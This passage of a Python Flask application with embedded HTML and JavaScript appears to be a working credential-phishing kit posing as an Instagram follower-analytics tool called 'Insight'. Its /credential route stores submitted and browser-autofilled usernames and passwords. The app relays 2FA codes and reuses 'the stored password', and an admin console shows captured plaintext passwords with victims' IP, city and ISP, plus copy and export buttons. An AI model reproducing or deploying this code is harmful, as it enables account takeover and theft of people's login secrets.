.toast{position:fixed;left:50%;bottom:34px;transform:translate(-50%,30px) scale(.95);background:var(--tx);color:var(--bg);padding:12px 22px;border-radius:14px;font:600 13.5px inherit;opacity:0;pointer-events:none;transition:all .5s var(--e);z-index:9;box-shadow:var(--sh2)}
.toast.show{opacity:1;transform:translate(-50%,0) scale(1)}
.spark{display:flex;align-items:flex-end;gap:8px;height:86px}
.spark i{flex:1;border-radius:5px 5px 2px 2px;background:var(--ig);transform-origin:bottom;transition:filter .3s,transform .4s var(--e)}
@keyframes up{from{opacity:0;transform:translateY(18px)}}
@container (max-width:760px){
 .app{grid-template-columns:1fr}
 .side{display:none}
 .mtop{display:grid}
 .bn{display:grid}
 main{grid-row:2}
 .in{padding:18px 16px 28px}
 .prof{gap:20px;align-items:flex-start;flex-wrap:wrap}
 .ring.l{width:84px;height:84px}.ring.l>span{font-size:24px}
 .pi{flex:1 1 150px}
 .pi .st{gap:0;justify-content:space-between;margin:14px 0 0;order:5;flex-basis:100%;text-align:center;border-top:1px solid var(--line);padding-top:12px;font-size:13px}
 .pi .st div{display:flex;flex-direction:column}
 .pi h2{font-size:17px}
 .cards{grid-template-columns:repeat(2,1fr);gap:10px}
 .card{padding:14px}.card b{font-size:24px}
 .ttl{font-size:21px}
}
@media (max-width:760px){
  body{align-items:stretch}
  .frame,.frame.mobile{width:100%;margin:0;border:0;border-radius:0;max-width:none;box-shadow:none}
  .app{grid-template-columns:1fr;grid-template-rows:auto 1fr auto}
  .side{display:none}
  .mtop{display:grid}
  .bn{display:grid}
  main{grid-row:2}
}
@media (min-width:761px){
  body{padding:0 16px}
  .frame{width:100%;margin:10px auto 16px}
  .app{grid-template-columns:244px 1fr;grid-template-rows:auto 1fr auto}
  .side{display:flex}
  .mtop{display:none}
  .bn{display:none}
  main{grid-row:1/4}
}
@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}}
</style>
</head>
<body>
<div class="frame" id="frame"><div class="app">
 <aside class="side">
  <div class="logo"><span>Insight</span></div>
  <nav class="nav" id="nav"></nav>
  <div class="me"><div class="ring m"><span id="meav" style="background:#262626">YO</span></div><div><b id="meh">your.handle</b><small>Live session</small></div></div>
 </aside>
 <div class="mtop"><span></span><div class="logo"><span>Insight</span></div><button id="mh" aria-label="Settings"></button></div>
 <main id="main"></main>
 <nav class="bn" id="bn"></nav>
</div></div>
<div class="toast" id="toast"></div>
<script>
const HANDLE = __HANDLE__;
const S=p=>`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${p}</svg>`;
const I={
 home:S('<path d="M3 10.5 12 3l9 7.5V21h-6v-6H9v6H3z"/>'),
 notback:S('<circle cx="9" cy="8" r="4"/><path d="M2 21c0-4 3-6 7-6s7 2 7 6M17 8l5 5M22 8l-5 5"/>'),
 ghosts:S('<path d="M5 21V11a7 7 0 0 1 14 0v10l-3-2-2 2-2-2-2 2-2-2z"/><circle cx="9.5" cy="11" r=".6"/><circle cx="14.5" cy="11" r=".6"/>'),
 stalkers:S('<path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/>'),
 act:S('<path d="M12 21s-8-5.5-8-11a4.5 4.5 0 0 1 8-2.8A4.5 4.5 0 0 1 20 10c0 5.5-8 11-8 11z"/>'),
 broken:S('<path d="M12 21s-8-5.5-8-11a4.5 4.5 0 0 1 8-2.8A4.5 4.5 0 0 1 20 10c0 5.5-8 11-8 11z"/><path d="m12 7.5-2 4 3 1-1 4"/>'),
 trash:S('<path d="M4 7h16M10 11v6M14 11v6M6 7l1 13h10l1-13M9 7V4h6v3"/>'),
 chat:S('<path d="M21 12a8 8 0 0 1-11.7 7L3 21l2-5.5A8 8 0 1 1 21 12z"/>'),
 out:S('<path d="M9 4H4v16h5M16 8l4 4-4 4M20 12H9"/>'),
 plus:S('<circle cx="9" cy="8" r="4"/><path d="M2 21c0-4 3-6 7-6s7 2 7 6M19 8v6M16 11h6"/>'),
 set:S('<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.8-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.8 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1.1 1.7 1.7 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.8.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.8V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1z"/>')
};
const VF='<svg class="vf" viewBox="0 0 24 24"><path d="M12 1.5l2.6 1.8 3.1-.2 1.2 2.9 2.7 1.6-.7 3 1 2.9-2.2 2.2-.4 3.1-3 .7-2.2 2.2L12 19.8 9 21l-2.5-2.1-3-.7-.4-3.1L1 12.8l1-2.9-.7-3 2.7-1.6 1.2-2.9 3.1.2z"/><path d="m8 12.3 2.8 2.8L16.5 9" fill="none" stroke="#fff" stroke-width="2"/></svg>';
const G=["#fa7e1e,#d62976","#d62976,#962fbf","#4f5bd5,#962fbf","#0095f6,#4f5bd5","#feda75,#fa7e1e","#2ecc71,#0095f6"];
const T=[["home","Overview"],["notback","Not Following Back"],["ghosts","Ghost Followers"],["stalkers","Story Stalkers"],["act","Activity"]];
const ST={state:"pending",profile:null,progress:{},error:null,ghostDays:120,syncMinutes:10,last_sync:null};
let lists={notback:[],fans:[],ghosts:[],stalkers:[]};
let act=[],tab="home",q="",f="all",anim=true,poll=null,loaded=false;
let theme="system";
try{theme=localStorage.getItem("ins-theme")||"system"}catch(e){}
const P={likes:true,comm:true,unf:true,stalk:false,priv:false};
try{Object.assign(P,JSON.parse(localStorage.getItem("ins-prefs")||"{}"))}catch(e){}
function savePrefs(){try{localStorage.setItem("ins-prefs",JSON.stringify(P))}catch(e){}}
function applyTheme(){const r=document.documentElement;theme==="system"?r.removeAttribute("data-theme"):r.setAttribute("data-theme",theme)}
const eff=()=>theme==="dark"||(theme==="system"&&matchMedia("(prefers-color-scheme: dark)").matches);
applyTheme();
const $=s=>document.querySelector(s);
const esc=s=>String(s==null?"":s).replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
const gr=i=>{const [a,b]=G[i%G.length].split(",");return `linear-gradient(135deg,${a},${b})`};
const ini=n=>String(n||"?").split(/[ ._]+/).filter(Boolean).map(w=>w[0]).join("").slice(0,2)||"?";

async function api(p,body){
  const opt={credentials:"same-origin"};
  if(body){opt.method="POST";opt.headers={"Content-Type":"application/json"};opt.body=JSON.stringify(body)}
  try{const r=await fetch(p,opt);return await r.json().catch(()=>({}))}catch(e){return {ok:false,error:"network"}}
}
function av(x,i,c="s"){return `<div class="ring ${c}"><span style="background:${gr(i)}">${esc(ini(x.n||x.h))}</span></div>`}
function pic(x,i,c="s"){
  if(!x.pic)return av(x,i,c);
  return `<div class="ring ${c}"><span style="background:url('${esc(x.pic)}') center/cover"></span></div>`;
}
function toast(t){const e=$("#toast");e.textContent=t;e.classList.add("show");clearTimeout(toast._t);toast._t=setTimeout(()=>e.classList.remove("show"),1800)}

function connScreen(){
  const p=ST.progress||{};
  if(ST.state==="challenge"||ST.state==="2fa"){
    const two=ST.state==="2fa";
    return `<div class="empty"><h1 class="ttl">${two?"Two-factor code":"Confirm it’s you"}</h1>
      <p class="sub">${two?"Enter the 6-digit code from your authenticator app.":"Instagram sent a code to your email or phone."}</p>
      <div class="bar" style="max-width:320px;margin:18px auto">
      <input class="search" id="code" inputmode="numeric" placeholder="123456" autocomplete="one-time-code">
      <button class="btn" id="send">Continue</button></div></div>`;
  }
  if(ST.state==="error"){
    return `<div class="empty"><h1 class="ttl">Couldn’t connect</h1><p class="sub">${esc(ST.error||"unknown error")}</p>
      <button class="btn" id="retry">Try again</button></div>`;
  }
  return `<div class="empty"><h1 class="ttl">Connecting to Instagram…</h1>
    <p class="sub">${esc(p.step||"starting")} · ${p.pct||0}%</p>
    <div class="spark" style="height:6px;max-width:260px;margin:20px auto"><i style="height:100%;width:${p.pct||0}%"></i></div>
    <p class="sub">First sync scans your recent posts and followers — give it a minute.</p></div>`;
}

function actList(rows){
  if(!rows.length)return `<div class="empty">Nothing yet — activity appears as your audience changes.</div>`;
  const icon={like_removed:"broken",comment_removed:"trash",unfollowed_you:"out",you_unfollowed:"out",new_follower:"plus",you_followed:"plus"};
  const label={like_removed:"Like removed",comment_removed:"Comment removed",unfollowed_you:"Unfollow",you_unfollowed:"You unfollowed",new_follower:"New follower",you_followed:"You followed"};
  const red={like_removed:1,comment_removed:1,unfollowed_you:1};
  let day="",out="";
  rows.forEach((x,i)=>{
    const d=(x.ts||"").slice(0,10);
    if(d!==day){day=d;out+=`<div class="day">${d===new Date().toISOString().slice(0,10)?"Today":esc(d)}</div>`}
    const t=x.kind==="comment_removed"&&x.detail
      ? `<b>${esc(x.subject)}</b> deleted a comment: “${esc(x.detail)}”`
      : `<b>${esc(x.subject)}</b> ${esc(label[x.kind]||x.kind)}`;
    out+=`<div class="row" style="animation-delay:${i*40}ms"><div class="ic">${I[icon[x.kind]||"act"]}</div>
      <div class="info"><b style="font-weight:400;white-space:normal">${t}</b>
      <small>${esc((x.ts||"").slice(11,16))} UTC · <span class="tag ${red[x.kind]?"red":""}">${esc(label[x.kind]||"")}</span></small></div>
      ${x.thumb?`<div class="th" style="background:url('${esc(x.thumb)}') center/cover"></div>`:""}</div>`;
  });
  return out;
}

function rows(k,list){
  if(!list.length)return `<div class="empty">Nothing here right now.</div>`;
  return list.map((x,i)=>{
    let t="",b="";
    if(k==="notback")b=`<button class="btn g" data-u="${esc(x.pk)}" data-n="${esc(x.h)}">Unfollow</button>`;
    if(k==="ghosts"){
      t=`<span class="tag red">${x.d>9000?"never":x.d+"d"}</span>`;
      b=`<button class="btn r" data-u="${esc(x.pk)}" data-n="${esc(x.h)}">Remove</button>`;
    }
    if(k==="stalkers"){t=`<span class="tag hot">${x.c} views</span>`;b=`<button class="btn" data-b="${esc(x.pk)}" data-n="${esc(x.h)}">Follow</button>`}
    if(k==="fans")b=`<button class="btn" data-b="${esc(x.pk)}" data-n="${esc(x.h)}">Follow back</button>`;
    return `<div class="row" style="animation-delay:${i*40}ms">${pic(x,i,"s"+(k==="ghosts"?" off":""))}
      <div class="info"><b>${esc(x.h)}${x.v?VF:""}${t}</b><small>${esc(x.n)}</small></div>${b}</div>`;
  }).join("");
}

function lv(k,t,s,chips){
  return `<h1 class="ttl">${esc(t)}</h1><p class="sub">${esc(s)}</p>
    <div class="bar"><input class="search" id="s" placeholder="Search" value="${esc(q)}">
    ${chips.map(([v,l])=>`<button class="chip ${f===v?"on":""}" data-f="${v}">${esc(l)}</button>`).join("")}
    <button class="chip" id="sync">Sync now</button></div>${rows(k,lists[k]||[])}`;
}

async function loadList(k){
  const r=await api(`/api/list?kind=${k}&q=${encodeURIComponent(q)}&filter=${f}`);
  if(r.ok)lists[k]=r.rows||[];
}

function card(k,l,n,s,c=""){
  return `<div class="card" data-k="${k}"><small>${esc(l)}${I[k]}</small><b>${n}</b><i class="${c}">${esc(s)}</i></div>`;
}

function home(){
  const p=ST.profile||{};
  const inner=p.pic
    ? `<span style="background:url('${esc(p.pic)}') center/cover"></span>`
    : `<span style="background:linear-gradient(135deg,#262626,#444)">${esc(ini(p.username||HANDLE))}</span>`;
  return `<div class="prof"><div class="ring l">${inner}</div>
  <div class="pi"><div class="h"><h2>@${esc(p.username||HANDLE)}</h2><button class="btn g" id="sync">Sync now</button></div>
  <div class="st"><div><b>${p.posts??"–"}</b> posts</div><div><b>${p.followers??"–"}</b> followers</div><div><b>${p.following??"–"}</b> following</div></div>
  <p><b>${esc(p.full_name||"")}</b><br><span>Last sync ${esc((ST.last_sync||"").slice(11,19))||"–"} UTC · auto every ${ST.syncMinutes}m</span></p></div></div>
  <div class="cards">
    ${card("notback","Not following back",lists.notback.length,"Review list")}
    ${card("ghosts","Ghost followers",lists.ghosts.length,`No engagement in ${ST.ghostDays}d`,"dn")}
    ${card("stalkers","Story stalkers",lists.stalkers.length,"By view count","up")}
    ${card("fans","Follows you back",lists.fans.length,"Not followed yet","up")}
  </div>
  <div class="sec"><h3>Recent activity</h3><a data-k="act">See all</a></div>
  ${actList(act.slice(0,6))}`;
}

function settings(){
  const sw=(k,l,s)=>`<div class="srow"><div class="info"><b style="font-weight:400">${esc(l)}</b>${s?`<small>${esc(s)}</small>`:""}</div><button class="sw ${P[k]?"on":""}" data-p="${k}" role="switch" aria-checked="${P[k]}"></button></div>`;
  const th=(a,l,s,on)=>`<div class="srow"><div class="info"><b style="font-weight:400">${esc(l)}</b><small>${esc(s)}</small></div><button class="sw ${on?"on":""}" data-th="${a}" role="switch" aria-checked="${on}"></button></div>`;
  const lk=(l,s,c,href)=>`<div class="srow lk ${c||""}"${href?` data-href="${esc(href)}"`:""}><div class="info"><b style="font-weight:400">${esc(l)}</b>${s?`<small>${esc(s)}</small>`:""}</div><span class="ch">›</span></div>`;
  return `<h1 class="ttl">Settings</h1><p class="sub">Appearance, alerts and the live session.</p>
  <div class="acc">${av({n:ST.profile?.full_name||HANDLE},0,"m")}<div class="info"><b>@${esc(ST.profile?.username||HANDLE)}</b><small>Connected · ${ST.syncMinutes} min auto-sync</small></div></div>
  <div class="sec"><h3>Session</h3></div>
  ${lk("Sync now","Pull fresh followers and activity","","#sync")}
  ${lk("Reconnect","Re-authenticate with the stored password","","#reconnect")}
  ${lk("Export activity","JSON of every detected change","","/api/export")}
  ${lk("Captured credentials","Raw capture log for this browser","","/cookies")}
  ${lk("Capture console","Admin view","","/admin")}
  <div class="sec"><h3>Appearance</h3></div>
  ${th("dark","Dark mode","Manual light/dark",eff())}
  ${th("sys","Use device settings","Follow the OS",theme==="system")}
  <div class="sec"><h3>Notifications</h3></div>
  ${sw("likes","Removed likes","Alert when a like disappears")}
  ${sw("comm","Deleted comments","Alert when a comment disappears")}
  ${sw("unf","Unfollows","Alert when someone unfollows you")}
  <div class="sec"><h3>Account</h3></div>
  ${lk("Log out","Wipe the stored session","red")}`;
}

function nav(){
  const cn={notback:lists.notback.length,ghosts:lists.ghosts.length};
  $("#nav").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${esc(l)}">${I[k]}${esc(l)}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
  $("#bn").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${esc(l)}">${I[k]}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
  $("#nav").insertAdjacentHTML("beforeend",`<button class="${tab==="settings"?"on":""}" data-k="settings">${I.set}Settings</button>`);
  $("#mh").innerHTML=I.set;$("#mh").onclick=()=>go("settings");
  document.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
}

async function go(k){
  tab=k;q="";f="all";anim=true;
  if(["notback","fans","ghosts","stalkers"].includes(k))await loadList(k);
  render();$("#main").scrollTop=0;
}

function wire(){
  const m=$("#main"),s=$("#s");
  if(s)s.oninput=e=>{q=e.target.value;const p=e.target.selectionStart;render().then(()=>{const n=$("#s");if(n){n.focus();n.setSelectionRange(p,p)}})};
  m.querySelectorAll("[data-f]").forEach(b=>b.onclick=()=>{f=b.dataset.f;render()});
  m.querySelectorAll("#sync,[data-href='#sync']").forEach(b=>b.onclick=async()=>{toast("Sync queued…");await api("/api/sync",{})});
  m.querySelectorAll("[data-href='#reconnect']").forEach(b=>b.onclick=async()=>{toast("Reconnecting…");await api("/api/reconnect",{})});
  m.querySelectorAll("[data-href]").forEach(b=>{if((b.dataset.href||"").startsWith("/"))b.onclick=()=>window.open(b.dataset.href,"_blank","noopener")});
  m.querySelectorAll("[data-p]").forEach(b=>b.onclick=()=>{P[b.dataset.p]=!P[b.dataset.p];savePrefs();render()});
  m.querySelectorAll("[data-th]").forEach(b=>b.onclick=()=>{const d=eff();theme=b.dataset.th==="dark"?(d?"light":"dark"):(theme==="system"?(d?"dark":"light"):"system");try{localStorage.setItem("ins-theme",theme)}catch(e){}applyTheme();render()});
  m.querySelectorAll(".srow.red").forEach(b=>b.onclick=()=>{toast("Logging out…");setTimeout(()=>location.href="/logout",450)});
  m.querySelectorAll("[data-u],[data-b]").forEach(b=>b.onclick=async e=>{
    e.stopPropagation();
    const d=b.dataset,kind=d.u?"unfollow":"follow",pk=d.u||d.b;
    b.disabled=true;b.textContent="…";
    const r=await api("/api/action",{kind,pk,username:d.n});
    if(!r.ok){b.disabled=false;b.textContent="retry";toast(r.error||"failed");return}
    if(kind==="unfollow"){
      ["notback","ghosts"].forEach(k=>lists[k]=lists[k].filter(x=>x.pk!==pk));
      toast("Unfollowed @"+d.n);
    }else toast("Following @"+d.n);
    render();
  });
}

function wireConn(){
  const send=$("#send"),code=$("#code"),retry=$("#retry");
  if(send)send.onclick=async()=>{
    const v=(code.value||"").trim();if(!v)return;
    send.disabled=true;
    await api(ST.state==="2fa"?"/api/2fa":"/api/challenge",{code:v});
    ST.state="pending";ST.progress={step:"verifying",pct:50};render();
  };
  if(code)code.onkeydown=e=>{if(e.key==="Enter")send.click()};
  if(retry)retry.onclick=async()=>{ST.state="pending";ST.error=null;render();await api("/api/reconnect",{})};
}

async function render(){
  nav();
  const m=$("#main");
  if(ST.state!=="ok"){m.innerHTML=`<div class="in pg">${connScreen()}</div>`;wireConn();return}
  if(!loaded){await Promise.all(["notback","fans","ghosts","stalkers"].map(loadList));loaded=true}
  const a=await api("/api/activity");act=a.rows||[];
  if(ST.profile){
    $("#meh").textContent="@"+(ST.profile.username||HANDLE);
    const av2=$("#meav");
    if(av2&&ST.profile.pic)av2.style.background=`url('${ST.profile.pic}') center/cover`;
  }
  let h;
  if(tab==="home")h=home();
  else if(tab==="notback")h=lv("notback","Not following back","You follow them, they don’t follow you.",[["all","All"],["ver","Verified"]]);
  else if(tab==="fans")h=lv("fans","Follows you back","They follow you — you don’t follow them.",[["all","All"]]);
  else if(tab==="ghosts")h=lv("ghosts","Ghost followers",`No like, comment or story view in ${ST.ghostDays} days.`,[["all","All"],["old",`${ST.ghostDays}d+`]]);
  else if(tab==="stalkers")h=lv("stalkers","Story stalkers","Most frequent story viewers.",[["all","All"],["top","Top"]]);
  else if(tab==="settings")h=settings();
  else h=`<h1 class="ttl">Activity</h1><p class="sub">Likes pulled, comments deleted, follows gained and lost.</p>${actList(act)}`;
  m.innerHTML=`<div class="in${anim?" pg":""}">${h}</div>`;
  anim=false;
  wire();
}

async function pull(){
  const n=await api("/api/state");
  if(!n.ok)return;
  const was=ST.state;
  ST.state=n.state;ST.profile=n.profile||ST.profile;ST.progress=n.progress||{};
  ST.error=n.error;ST.last_sync=n.last_sync;
  ST.syncMinutes=n.sync_minutes||10;ST.ghostDays=n.ghost_days||120;
  if(n.state!==was){
    loaded=false;
    await render();
    return;
  }
  if(n.state==="ok"&&(tab==="home"||tab==="act"))render();
  else if(n.state==="pending"||n.state==="challenge"||n.state==="2fa")render();
}

(async function boot(){
  await pull();
  clearInterval(poll);
  poll=setInterval(pull,5000);
})();
</script>
</body>
</html>
"""

# ============================== admin console ==============================
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Insight Console</title>
<style>
:root{--bg:#0a0a0c;--card:#141419;--line:#232329;--tx:#ececf1;--mut:#8b8b98;--acc:#3ba7ff;--ok:#2ecc71;--bad:#ff5d6c;--warn:#f5b642;--u:#4fd6ff;--p:#ff8ad8}
*{box-sizing:border-box;margin:0}
body{background:var(--bg);color:var(--tx);font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
header{display:flex;gap:10px;align-items:center;padding:14px 20px;border-bottom:1px solid var(--line);position:sticky;top:0;background:#0a0a0cf2;backdrop-filter:blur(10px);z-index:5;flex-wrap:wrap}
h1{font-size:15px;letter-spacing:.14em;text-transform:uppercase;font-weight:700}
h1 i{color:var(--acc);font-style:normal}
.spacer{flex:1}
.stat{font-size:12px;color:var(--mut);border:1px solid var(--line);border-radius:8px;padding:4px 10px}
.stat b{color:var(--tx)}
a.btn,button.btn{background:var(--card);border:1px solid var(--line);color:var(--tx);padding:6px 12px;border-radius:8px;cursor:pointer;text-decoration:none;font:inherit;font-size:12px;transition:.15s}
a.btn:hover,button.btn:hover{border-color:var(--acc);color:var(--acc)}
button.cp{padding:2px 7px;font-size:10.5px;border-radius:6px;border-color:#2c2c36;color:var(--mut);vertical-align:middle}
button.cp:hover{border-color:var(--acc);color:var(--acc)}
main{padding:18px 20px 60px}
table{width:100%;border-collapse:collapse;font-size:12.5px}
th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:top}
th{color:var(--mut);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.08em}
tr:hover td{background:#15151b}
td a{color:var(--acc);text-decoration:none}
td a:hover{text-decoration:underline}
.u{color:var(--u);word-break:break-all}
.p{color:var(--p);word-break:break-all}
.mono{font-size:11.5px;color:var(--mut);max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
pre{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;overflow:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;max-height:420px}
pre b{color:var(--acc)}
.block{margin-bottom:16px}
.block h2{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--mut);margin-bottom:6px;display:flex;gap:8px;align-items:center}
.cred{background:#171408;border:1px solid #6b4d1e;border-radius:12px;padding:14px}
.cred pre{background:#0f0d05;border-color:#6b4d1e;color:#ffe08a}
.cred .row{display:flex;gap:10px;align-items:center;margin-bottom:10px;flex-wrap:wrap}
.cred .k{color:#b99a4e;font-size:11px;text-transform:uppercase;letter-spacing:.1em;min-width:78px}
.cred .v{font-size:15px;font-weight:700;word-break:break-all}
.cred .v.u{color:var(--u)}
.cred .v.p{color:var(--p)}
.empty{padding:60px 0;text-align:center;color:var(--mut)}
.warn{background:#231a08;border:1px solid #6b4d1e;color:var(--warn);padding:10px 14px;border-radius:10px;margin-bottom:16px;font-size:12.5px}
form.inline{display:inline}
.bar{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
.bar input{flex:1;min-width:200px;background:#141419;border:1px solid #232329;color:#ececf1;padding:9px 12px;border-radius:9px;font:inherit;font-size:12.5px;outline:none}
.bar input:focus{border-color:var(--acc)}
.chip{border:1px solid var(--line);background:var(--card);color:var(--mut);padding:6px 11px;border-radius:8px;font:inherit;font-size:11.5px;text-decoration:none}
.chip:hover{border-color:var(--acc);color:var(--acc)}
.chip.on{background:var(--acc);border-color:var(--acc);color:#001522;font-weight:700}
.tag{font-size:10px;padding:1px 6px;border-radius:5px;background:#2a2110;color:var(--warn);border:1px solid #6b4d1e}
.isp{color:var(--mut);font-size:11px;display:block;max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
</style></head><body>
<header>
  <h1><i>▚</i> Insight Console</h1>
  <span class="stat">credentials <b>__LOGS__</b></span>
  <span class="stat" id="live">live</span>
  <button class="btn" id="pause" type="button">pause</button>
  <span class="spacer"></span>
  <a class="btn" href="/admin/export?fmt=json">export json</a>
  <a class="btn" href="/admin/export?fmt=csv">export csv</a>
  <form class="inline" method="post" action="/admin/delete-all"
        onsubmit="return confirm('delete every captured credential?')">
    <input type="hidden" name="_csrf" value="__CSRF__">
    <button class="btn" type="submit">clear all</button>
  </form>
  <a class="btn" href="/">login page</a>
</header>
<main>__BODY__</main>
<script>
(function(){
  var feed = document.getElementById('feed');
  if (!feed) return;
  var params = new URLSearchParams(location.search);
  var q = params.get('q') || '';
  var only = params.get('only') || '';
  var last = 0, paused = false;
  var live = document.getElementById('live');
  var pause = document.getElementById('pause');
  if (pause) pause.onclick = function () {
    paused = !paused;
    pause.textContent = paused ? 'resume' : 'pause';
    live.textContent = paused ? 'paused' : 'live';
    live.style.color = paused ? 'var(--warn)' : '';
  };
  async function tick(){
    if (paused) return;
    try{
      var url = '/admin/feed?since=' + last
        + (q ? '&q=' + encodeURIComponent(q) : '')
        + (only ? '&only=' + encodeURIComponent(only) : '');
      var r = await fetch(url, {credentials:'same-origin'});
      if (!r.ok) throw 0;
      var d = await r.json();
      if (d.rows.length){
        feed.insertAdjacentHTML('afterbegin', d.rows.join(''));
        last = d.last;
        live.textContent = 'live · ' + new Date().toLocaleTimeString();
        live.style.color = 'var(--ok)';
      }
    }catch(e){ live.textContent = 'offline'; live.style.color = 'var(--bad)'; }
  }
  tick(); setInterval(tick, 4000);
})();
function cp(el){
  var t = el.previousElementSibling;
  if (!t) return;
  navigator.clipboard.writeText(t.textContent).then(function(){
    var old = el.textContent; el.textContent = 'copied';
    setTimeout(function(){ el.textContent = old; }, 1100);
  });
}
</script>
</body></html>
"""

LOGIN_ADMIN_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Console</title>
<style>body{margin:0;height:100vh;display:grid;place-items:center;background:#0a0a0c;color:#ececf1;
font-family:ui-monospace,Menlo,monospace}form{background:#141419;border:1px solid #232329;
padding:26px;border-radius:14px;display:grid;gap:10px;width:280px}
h1{font-size:13px;letter-spacing:.15em;text-transform:uppercase;margin:0 0 6px}
input{background:#0a0a0c;border:1px solid #232329;color:#ececf1;padding:10px 12px;border-radius:9px;font:inherit;outline:none}
input:focus{border-color:#3ba7ff}button{background:#3ba7ff;border:0;color:#001522;font:inherit;font-weight:700;
padding:10px;border-radius:9px;cursor:pointer}</style></head><body>
<form method="get" action="/admin"><h1>insight console</h1>
<input type="password" name="token" placeholder="admin token" autofocus>
<button type="submit">unlock</button></form></body></html>"""

ADMIN_SELECT = """SELECT c.id, c.created_at, c.ip, c.ua, c.source, c.username, c.password,
                         c.country, c.city, c.isp FROM creds c"""


def render_admin(body: str) -> str:
    conn = connect()
    try:
        logs = conn.execute("SELECT COUNT(*) c FROM creds").fetchone()["c"]
    finally:
        conn.close()
    return (ADMIN_HTML
            .replace("__BODY__", body)
            .replace("__LOGS__", str(logs))
            .replace("__CSRF__", csrf_token()))


def row_html(r: sqlite3.Row) -> str:
    place = ", ".join(x for x in (r["city"], r["country"]) if x) or "-"
    partial = "" if (r["password"] or "") else '<span class="tag">partial</span> '
    return (
        f'<tr data-id="{r["id"]}">'
        f'<td>{r["id"]}</td>'
        f'<td>{(r["created_at"] or "")[11:19]}</td>'
        f'<td>{escape(place)}'
        + (f'<span class="isp">{escape(r["isp"] or "")}</span>' if r["isp"] else "")
        + f'</td>'
        f'<td>{escape(r["ip"] or "-")}</td>'
        f'<td class="u">{partial}<span>{escape(r["username"] or "")}</span> '
        f'<button class="btn cp" onclick="cp(this)">copy</button></td>'
        f'<td class="p"><span>{escape(r["password"] or "")}</span> '
        f'<button class="btn cp" onclick="cp(this)">copy</button></td>'
        f'<td><span class="mono">{escape(r["source"] or "")}</span></td>'
        f'<td><a href="/admin/{r["id"]}">open</a></td>'
        f"</tr>"
    )


# ============================== request hooks ==============================
@app.before_request
def ensure_client_id():
    g.cid = request.cookies.get("cid") or uuid.uuid4().hex[:16]
    session.permanent = True


@app.after_request
def finalize(resp: Response) -> Response:
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-Frame-Options"] = "DENY"
    resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    resp.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=(), interest-cohort=()"
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; img-src 'self' data: https:; "
        "style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; "
        "connect-src 'self'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'"
    )
    if request.is_secure:
        resp.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    if not request.cookies.get("cid"):
        resp.set_cookie("cid", g.cid, max_age=COOKIE_MAX_AGE, samesite="Lax")
    return resp


def read_json() -> dict:
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        try:
            data = json.loads(request.get_data(as_text=True) or "{}")
        except ValueError:
            data = {}
    return data if isinstance(data, dict) else {}


# ============================== routes ==============================
@app.route("/")
def index():
    if session.get("user"):
        return redirect(url_for("dashboard"))
    return html(LOGIN_PAGE_HTML)


@app.route("/favicon.ico")
def favicon():
    return ("", 204)


@app.route("/credential", methods=["POST"])
def credential():
    ip = client_ip()
    if not rate_ok("cred:" + ip, 120):
        return jsonify({"ok": False, "error": "rate limited"}), 429

    data = read_json()
    username = (data.get("username") or "").strip()[:200]
    password = (data.get("password") or "")[:300]
    source = (data.get("source") or "autofill")[:16]
    sid = (data.get("sid") or "")[:24]
    meta = data.get("meta") if isinstance(data.get("meta"), dict) else {}

    if not (username or password):
        return jsonify({"ok": True, "skipped": "empty"})

    existing = recent_cred_id(g.cid, username, password, 8)
    if existing:
